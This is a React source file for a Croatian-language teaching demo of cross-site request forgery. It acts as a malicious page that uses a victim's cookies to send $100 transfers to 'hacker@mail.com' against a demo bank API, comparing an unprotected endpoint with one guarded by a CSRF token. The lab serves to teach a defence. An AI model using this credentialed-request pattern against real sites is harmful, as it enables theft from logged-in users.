import React, { useEffect } from "react";
import "./App.css";
import axios from "axios";
axios.defaults.withCredentials = true;

const API_URL = process.env.REACT_APP_API_URL || "http://localhost:8000";

interface User {
  id: number;
  email: string;
  balance: number;
}

function App() {
  const [data, setData] = React.useState("null");
  const [data1, setData1] = React.useState("null");
  const [users, setUsers] = React.useState<User[]>([]);

  const secured = async () => {
    fetch(`${API_URL}/api/transfer-secure?amount=100&to=hacker@mail.com`, {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
      },
    })
      .then((response) => {
        return response.json();
      })
      .then((data) => {
        setData(data);
      });
  };

  const unsecured = async () => {
    fetch(`${API_URL}/api/transfer?amount=100&to=hacker@mail.com`, {
      method: "GET",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
      },
    })
      .then((response) => {
        return response.json();
      })
      .then((data) => {
        setData1(data);
        getUsers();
      });
  };

  const getUsers = async () => {
    fetch(`${API_URL}/users`)
      .then((response) => {
        return response.json();
      })
      .then((data) => {
        setUsers(data);
      });
  };

  const resetBalance = async (): Promise<void> => {
    await fetch(`${API_URL}/reset-balance`);
    getUsers();
  };

  useEffect(() => {
    getUsers();
  }, []);

  return (
    <div className="page">
      <div className="container">
        <h1>Sigurnost na prvom mjestu. Nikad niste bili sigurniji!</h1>
        <div style={{ display: "flex", flexDirection: "column" }}>
          <p className="text">
            Ovo je primjer stranice koja će iskoristit CSRF i napraviti
            maliciozni zahtjev na poslužitelj. Ako se nalazite na nekoj stranici
            i ulogirani ste i u nekoj ste sekciji di se prikazuju komentari. U
            komentaru koji je napisao neki user pronađete link koji izgleda
            sasvim normalno, npr. pitali ste nekoga za pomoć oko nekog projekta
            i on vam je poslao link na vanjsku stranicu na kojoj se nalazi
            "rješenje". Taj link odvest će vas do ove stranice i u pozadini će
            na "render" stranice pokrenuti zahtjev.
          </p>
          <p className="text">
            Uzimimo za primjer da postoji bankarski sustav i da su u njemu
            korisnici koji imaju određeno stanje na računu.
          </p>
          <div className="users">
            {users.map((user) => (
              <div className="user">
                <p>{user.email}</p>
                <p>${user.balance}</p>
              </div>
            ))}
            <button className="button" onClick={resetBalance}>
              Resetiraj balans
            </button>
          </div>
          <p className="text">
            Link koji ste otvorili će u pozadini pokrenuti zahtjev koji će
            prebaciti 100$ s vašeg računa na njegov. Taj poziv će pozivati ovaj
            endpoint:
          </p>
          <code>/api/transfer-secure?amount=100&to=hacker@mail.com</code>
          <p className="text">
            Zahtjev će biti uspješan i vaš račun će biti smanjen za 100$, jer je
            korisnik poslao zahtjev s vašim cookie-ima.
          </p>
          <p className="text">
            Na ovoj stranici sam ipak ostavio korisniku da sam pokrene napad
            kako bi se jasno vidjelo koji je endpoint zaštičen a koji nije. Prvi
            transfer nije zaštičen i on će uspješno preko cookie-a napravit
            transfer i krađu novca (vidljivo u network tabu kako se šalju
            cookie-i). Nakon pokretanja pogledajte stanje korisnika.
          </p>
          <div className="attack">
            <button className="button" onClick={unsecured}>
              Transfer unsecured
            </button>
            <p>Unsecured response:{JSON.stringify(data1)}</p>
          </div>

          <p className="text">
            Postoji i endpoint koji je zaštičen CSRF tokenom i hacker ne može
            izvršiti napad. Rezultat poziva biti će "Permission denied".
          </p>
          <div className="attack">
            <button className="button" onClick={secured}>
              Transfer secured
            </button>
            <p>Secured response:{JSON.stringify(data)}</p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
